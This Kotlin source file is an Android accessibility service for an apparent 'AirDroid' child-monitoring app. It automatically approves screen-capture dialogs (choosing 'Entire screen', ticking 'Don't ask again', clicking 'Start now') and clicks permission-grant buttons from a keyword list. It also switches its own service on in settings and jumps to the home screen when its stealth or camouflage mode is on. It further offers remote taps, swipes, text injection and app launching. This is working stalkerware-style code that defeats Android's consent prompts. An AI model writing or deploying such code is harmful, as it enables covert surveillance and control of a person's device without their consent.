package com.example.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.AirDroidChildApp
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch

class AirDroidAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "AirDroidA11yService"

        @Volatile
        var instance: AirDroidAccessibilityService? = null
            private set

        private val _isServiceRunning = MutableStateFlow(false)
        val isServiceRunning: StateFlow<Boolean> = _isServiceRunning.asStateFlow()

        private val _foregroundPackage = MutableStateFlow("")
        val foregroundPackage: StateFlow<String> = _foregroundPackage.asStateFlow()

        private val _autoGrantedCount = MutableStateFlow(0)
        val autoGrantedCount: StateFlow<Int> = _autoGrantedCount.asStateFlow()

        fun isConnected(): Boolean = instance != null

        // System packages for permissions & settings
        private val PERMISSION_PACKAGES = setOf(
            "com.android.permissioncontroller",
            "com.google.android.permissioncontroller",
            "com.android.settings",
            "com.android.systemui",
            "com.google.android.packageinstaller",
            "com.android.packageinstaller"
        )

        // Keywords to auto-grant confirmation buttons
        private val AUTO_GRANT_TEXTS = listOf(
            "while using the app",
            "only this time",
            "start now",
            "start recording or casting",
            "always allow",
            "allow all the time",
            "allow",
            "turn on",
            "permit",
            "agree",
            "confirm",
            "continue"
        )
    }

    private val serviceScope = CoroutineScope(Dispatchers.Default + Job())
    private var lastAutoClickTimestamp = 0L

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        _isServiceRunning.value = true

        try {
            val info = serviceInfo ?: android.accessibilityservice.AccessibilityServiceInfo()
            info.flags = android.accessibilityservice.AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            info.feedbackType = android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_GENERIC
            info.notificationTimeout = 100
            serviceInfo = info
        } catch (e: Exception) {
            Log.w(TAG, "Could not set dynamic serviceInfo", e)
        }

        Log.i(TAG, "AirDroid Accessibility Service connected and ready for automation")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val pkgName = event.packageName?.toString() ?: ""
        if (pkgName.isNotEmpty() && pkgName != packageName) {
            _foregroundPackage.value = pkgName

            // 1. App Blocker Check (Screen time & restricted apps)
            checkAndEnforceAppBlock(pkgName)
        }

        // 2. High-Priority Screen Share (MediaProjection) Auto-Approval Check
        val stealthMgr = AirDroidChildApp.stealthManager
        if (stealthMgr?.isAutoClickerActive?.value == true) {
            val root = rootInActiveWindow
            if (root != null) {
                if (handleScreenCastDialog(root, pkgName)) {
                    return
                }
            }

            // 3. General Permissions & Settings Switches (Throttled)
            val now = System.currentTimeMillis()
            if (now - lastAutoClickTimestamp > 1000) {
                scanAndAutoGrantDialogs(event)
            }
        }
    }

    /**
     * Specialized handler for Android Screen Casting / MediaProjection permission dialogs.
     * Selects "Entire screen", checks "Don't ask again", and auto-clicks "Start now".
     */
    private fun handleScreenCastDialog(root: AccessibilityNodeInfo, pkg: String): Boolean {
        val isSystemDialog = pkg.contains("systemui", ignoreCase = true) ||
                pkg.contains("permissioncontroller", ignoreCase = true) ||
                pkg == "android" || pkg.contains("packageinstaller", ignoreCase = true)

        if (!isSystemDialog) return false

        val castKeywords = listOf(
            "recording or casting",
            "cast with",
            "share your screen",
            "entire screen",
            "a single app",
            "start recording",
            "exposing sensitive",
            "everything that's visible",
            "screen capture"
        )

        var isCastPrompt = false
        for (kw in castKeywords) {
            if (root.findAccessibilityNodeInfosByText(kw).isNotEmpty()) {
                isCastPrompt = true
                break
            }
        }

        if (!isCastPrompt) return false

        Log.i(TAG, "MediaProjection / Screen Share system dialog detected! Executing automated Entire Screen approval...")

        // Step 1: Ensure "Entire screen" is selected instead of "A single app"
        val singleAppNodes = root.findAccessibilityNodeInfosByText("A single app")
        if (singleAppNodes.isNotEmpty()) {
            for (node in singleAppNodes) {
                tryClickNodeOrParent(node, "A single app spinner")
                break
            }
        }

        val entireScreenNodes = root.findAccessibilityNodeInfosByText("Entire screen")
        if (entireScreenNodes.isNotEmpty()) {
            for (node in entireScreenNodes) {
                tryClickNodeOrParent(node, "Entire screen")
            }
        } else {
            val shareEntireNodes = root.findAccessibilityNodeInfosByText("Share entire screen")
            for (node in shareEntireNodes) {
                tryClickNodeOrParent(node, "Share entire screen")
            }
        }

        // Step 2: Check "Don't ask again" / "Remember this choice"
        val dontAskKeywords = listOf("don't ask again", "do not ask again", "remember this choice", "always allow")
        for (dak in dontAskKeywords) {
            val dakNodes = root.findAccessibilityNodeInfosByText(dak)
            for (node in dakNodes) {
                if (!node.isChecked) {
                    tryClickNodeOrParent(node, "Don't ask again checkbox")
                }
            }
        }

        val checkboxes = mutableListOf<AccessibilityNodeInfo>()
        findNodesByClassName(root, "android.widget.CheckBox", checkboxes)
        for (cb in checkboxes) {
            if (!cb.isChecked && cb.isClickable) {
                cb.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }

        // Step 3: Click confirmation button ("Start now", "Start recording or casting", "Share screen", "Start")
        val confirmKeywords = listOf("start now", "start recording or casting", "share screen", "start", "allow")
        for (ck in confirmKeywords) {
            val confirmNodes = root.findAccessibilityNodeInfosByText(ck)
            if (confirmNodes.isNotEmpty()) {
                for (node in confirmNodes) {
                    if (tryClickNodeOrParent(node, ck)) {
                        lastAutoClickTimestamp = System.currentTimeMillis()
                        _autoGrantedCount.value += 1
                        serviceScope.launch {
                            AirDroidChildApp.repository?.logAction(
                                "SCREEN_CAST_AUTO_APPROVED",
                                "Auto-selected 'Entire Screen' & clicked '$ck' on MediaProjection dialog",
                                isSuccess = true
                            )
                            delay(350)
                            val stealth = AirDroidChildApp.stealthManager
                            if (stealth?.isAppIconHidden?.value == true || stealth?.isCamouflageEnabled?.value == true) {
                                performGlobalAction(GLOBAL_ACTION_HOME)
                            }
                        }
                        return true
                    }
                }
            }
        }

        return false
    }

    private fun checkAndEnforceAppBlock(pkgName: String) {
        val stealthMgr = AirDroidChildApp.stealthManager ?: return
        if (stealthMgr.isPackageBlocked(pkgName)) {
            Log.w(TAG, "Child opened blocked package: $pkgName. Enforcing parental restriction!")
            performGlobalAction(GLOBAL_ACTION_HOME)
            serviceScope.launch {
                AirDroidChildApp.repository?.logAction(
                    "APP_BLOCKED",
                    "Parent restricted app $pkgName was closed automatically",
                    isSuccess = true
                )
            }
        }
    }

    /**
     * Inspects active window nodes to detect system permission dialogs or settings switches
     * and automatically performs ACTION_CLICK.
     */
    private fun scanAndAutoGrantDialogs(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: ""
        val isPermPackage = PERMISSION_PACKAGES.any { pkg.contains(it, ignoreCase = true) }

        // Also check if current event or window is a dialog
        val root = rootInActiveWindow ?: return

        try {
            // Check for known permission dialog buttons by keyword
            for (keyword in AUTO_GRANT_TEXTS) {
                val nodes = root.findAccessibilityNodeInfosByText(keyword)
                if (nodes.isNotEmpty()) {
                    for (node in nodes) {
                        if (tryClickNodeOrParent(node, keyword)) {
                            lastAutoClickTimestamp = System.currentTimeMillis()
                            _autoGrantedCount.value += 1
                            serviceScope.launch {
                                AirDroidChildApp.repository?.logAction(
                                    "AUTO_GRANT_CLICK",
                                    "Auto-clicked permission button: \"$keyword\" on $pkg",
                                    isSuccess = true
                                )
                            }
                            return
                        }
                    }
                }
            }

            // In System Settings, if user opened settings for our service, toggle switch ON
            if (isPermPackage) {
                // Check if title has our app name and a switch is unchecked
                val appTitleNodes = root.findAccessibilityNodeInfosByText("AirDroid")
                if (appTitleNodes.isNotEmpty()) {
                    val switches = mutableListOf<AccessibilityNodeInfo>()
                    findNodesByClassName(root, "android.widget.Switch", switches)
                    findNodesByClassName(root, "androidx.appcompat.widget.SwitchCompat", switches)

                    for (sw in switches) {
                        if (!sw.isChecked && sw.isClickable) {
                            sw.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            lastAutoClickTimestamp = System.currentTimeMillis()
                            _autoGrantedCount.value += 1
                            serviceScope.launch {
                                AirDroidChildApp.repository?.logAction(
                                    "AUTO_SWITCH_TOGGLE",
                                    "Auto-toggled AirDroid service switch to ON in settings",
                                    isSuccess = true
                                )
                            }
                            return
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in scanAndAutoGrantDialogs", e)
        }
    }

    private fun tryClickNodeOrParent(node: AccessibilityNodeInfo, label: String): Boolean {
        if (node.isClickable) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            Log.d(TAG, "Auto-clicked node directly: $label")
            return true
        }
        var parent = node.parent
        var depth = 0
        while (parent != null && depth < 3) {
            if (parent.isClickable) {
                parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Log.d(TAG, "Auto-clicked parent node: $label")
                return true
            }
            parent = parent.parent
            depth++
        }
        return false
    }

    private fun findNodesByClassName(
        root: AccessibilityNodeInfo,
        targetClass: String,
        outList: MutableList<AccessibilityNodeInfo>
    ) {
        if (root.className?.toString() == targetClass) {
            outList.add(root)
        }
        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            findNodesByClassName(child, targetClass, outList)
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "AirDroid Accessibility Service interrupted")
        _isServiceRunning.value = false
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) {
            instance = null
            _isServiceRunning.value = false
        }
        Log.i(TAG, "AirDroid Accessibility Service destroyed")
    }

    /**
     * Dispatches a single click at the specified (x, y) coordinates.
     */
    fun dispatchClick(x: Float, y: Float, callback: ((Boolean) -> Unit)? = null): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            callback?.invoke(false)
            return false
        }

        val clickPath = Path().apply { moveTo(x, y) }
        val stroke = GestureDescription.StrokeDescription(clickPath, 0, 50)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()

        return dispatchGesture(gesture, object : GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                super.onCompleted(gestureDescription)
                callback?.invoke(true)
            }
            override fun onCancelled(gestureDescription: GestureDescription?) {
                super.onCancelled(gestureDescription)
                callback?.invoke(false)
            }
        }, null)
    }

    /**
     * Dispatches a long press at the specified (x, y) coordinates.
     */
    fun dispatchLongPress(x: Float, y: Float, durationMs: Long = 800, callback: ((Boolean) -> Unit)? = null): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            callback?.invoke(false)
            return false
        }

        val clickPath = Path().apply { moveTo(x, y) }
        val stroke = GestureDescription.StrokeDescription(clickPath, 0, durationMs)
        val gesture = GestureDescription.Builder().addStroke(stroke).build()

        return dispatchGesture(gesture, object : GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                super.onCompleted(gestureDescription)
                callback?.invoke(true)
            }
            override fun onCancelled(gestureDescription: GestureDescription?) {
                super.onCancelled(gestureDescription)
                callback?.invoke(false)
            }
        }, null)
    }

    /**
     * Dispatches a swipe or drag gesture from (startX, startY) to (endX, endY).
     */
    fun dispatchSwipe(
        startX: Float,
        startY: Float,
        endX: Float,
        endY: Float,
        durationMs: Long = 300,
        callback: ((Boolean) -> Unit)? = null
    ): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            callback?.invoke(false)
            return false
        }

        val swipePath = Path().apply {
            moveTo(startX, startY)
            lineTo(endX, endY)
        }

        val stroke = GestureDescription.StrokeDescription(swipePath, 0, durationMs.coerceAtLeast(100))
        val gesture = GestureDescription.Builder().addStroke(stroke).build()

        return dispatchGesture(gesture, object : GestureResultCallback() {
            override fun onCompleted(gestureDescription: GestureDescription?) {
                super.onCompleted(gestureDescription)
                callback?.invoke(true)
            }
            override fun onCancelled(gestureDescription: GestureDescription?) {
                super.onCancelled(gestureDescription)
                callback?.invoke(false)
            }
        }, null)
    }

    /**
     * Remotely injects text into the currently active editable input field.
     */
    fun dispatchSetText(text: String): Boolean {
        val root = rootInActiveWindow ?: return false
        val focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        if (focusedNode != null && focusedNode.isEditable) {
            val arguments = Bundle().apply {
                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            }
            val result = focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
            Log.d(TAG, "Remotely injected text: \"$text\" with result=$result")
            return result
        }
        return false
    }

    /**
     * Dispatches simulated hardware buttons via Global Actions.
     */
    fun dispatchGlobalKey(actionId: Int): Boolean {
        val globalAction = when (actionId) {
            1 -> GLOBAL_ACTION_HOME
            2 -> GLOBAL_ACTION_BACK
            3 -> GLOBAL_ACTION_RECENTS
            4 -> GLOBAL_ACTION_NOTIFICATIONS
            5 -> GLOBAL_ACTION_QUICK_SETTINGS
            6 -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) GLOBAL_ACTION_LOCK_SCREEN else GLOBAL_ACTION_BACK
            else -> return false
        }
        return performGlobalAction(globalAction)
    }

    /**
     * Remotely launches an app by package name.
     */
    fun launchAppByPackage(pkg: String): Boolean {
        return try {
            val launchIntent = packageManager.getLaunchIntentForPackage(pkg)
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(launchIntent)
                true
            } else false
        } catch (e: Exception) {
            Log.e(TAG, "Error launching app: $pkg", e)
            false
        }
    }
}
